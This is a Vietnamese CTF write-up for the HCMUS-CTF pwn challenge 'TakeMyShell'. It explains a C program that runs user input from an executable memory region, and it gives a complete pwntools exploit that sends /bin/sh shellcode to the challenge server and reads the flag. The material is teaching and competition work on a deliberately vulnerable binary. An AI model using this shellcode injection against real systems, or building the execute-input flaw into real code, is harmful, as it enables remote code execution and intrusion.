## ⚡ [TakeMyShell](https://ctf.hcmus.edu.vn/challenges#TakeMyShell)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/178-pts-brightgreen.svg)](https://img.shields.io/badge/178-pts-brightgreen.svg)

Tác giả: `pakkunandy`



Tags: `pwn` `shellcode`

### Challenge Description

Mã nguồn: [takemyshell.c](./takemyshell.c)

### Summary

Challenge này yêu cầu ta lấy được môi trường thực thi trên server.

Đầu tiên, kiểm tra thông tin binary:

```bash
$ checksec takemyshell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Chương trình này chạy trên nhân x86, đã tắt các bảo vệ. Đồng thời, nó còn có phân vùng có quyền đọc ghi và thực thi code riêng trên bộ nhớ. 


Các hàm chức năng:

```c++
int main(int argc, char*argv[]){
    clean();
    printf("Once again, wellcome to HCMUS-CTF!!!\n");
    printf("This challenge, I just reuse some existing challenge, to encourage you some points...\n");
    printf("You also learnt it in the class :)");
    fflush(stdout);
    damaged();
    return 0;
}
```

```c++
void damaged(){
    char * s = (char *)mmap(NULL, STUFF_CAPACITY, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(s == MAP_FAILED){
        printf("We don't have enough space for you. Please talk to us!!!\n");
        exit(0);
    }
    printf("Just tell me, your %d byte \n", STUFF_CAPACITY);
    fflush(stdout);
    int len = read(STDIN_FILENO, s, STUFF_CAPACITY);
    if(len == 0){
        printf("Nothing? Bye:(");
        exit(0);
    }
    void (*f)() = (void (*)())s;
    f();
}
```

Chương trình đã cấp phát 1 vùng nhớ thông qua lời gọi hàm [mmap](https://linuxhint.com/using_mmap_function_linux/), với đầy đủ 3 quyền `PROT_EXEC|PROT_READ|PROT_WRITE` và được lưu trên vùng nhớ heap thông qua cờ `MAP_ANONYMOUS`.

Sau đó, chương trình cho phép người dùng nhập dữ liệu tối đa `STUFF_CAPACITY = 60` bytes lên vùng nhớ đó, rồi ép kiểu vùng nhớ về dạng **con trỏ hàm**, và chạy hàm này một cách bình thường. 

Okey, vậy nghĩa là ta chỉ cần gửi 1 hàm có chức năng gọi `/bin/sh` là sẽ lấy được shell.

### Exploit

Theo lý thuyết, ta sẽ viết hàm gọi `/bin/sh` (C/C++ hoặc assembly), rồi dịch sang mã máy nhị phân và gửi tới binary thực thi. Tuy nhiên, để đảm bảo payload ngắn và tiện nhất, ta chỉ cần dùng thư viện `shellcraft`.



```python
>>> from pwn import shellcraft
>>> shellcraft.sh()
"    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push b'/bin///sh\\x00' */\n    push 0x68\n    push 0x732f2f2f\n    push 0x6e69622f\n    mov ebx, esp\n    /* push argument array ['sh\\x00'] */\n    /* push 'sh\\x00\\x00' */\n    push 0x1010101\n    xor dword ptr [esp], 0x1016972\n    xor ecx, ecx\n    push ecx /* null terminate */\n    push 4\n    pop ecx\n    add ecx, esp\n    push ecx /* 'sh\\x00' */\n    mov ecx, esp\n    xor edx, edx\n    /* call execve() */\n    push SYS_execve /* 0xb */\n    pop eax\n    int 0x80\n"
>>> from pwn import asm
>>> len(asm(shellcraft.sh()))
44
>>>
```
Kích thước `shellcode` là **44** bytes.

## Code

```python
#!/usr/bin/env python

from pwn import *

#sh = process('./takemyshell')
sh = remote("159.65.13.76", 62111)

STUFF_CAPACITY = 60

shellcode = asm(shellcraft.sh())

# send this payload and get the shell
#sh.sendline(shellcode)

# send this payload and get the flag automatic
sh.sendline(shellcode.ljust(STUFF_CAPACITY, 'A') + "cat flag.txt;exit")

sh.interactive()
```


📫 Flag: **`HCMUS-CTF{}`**

---
*[Back to table of contents](../README.md)*
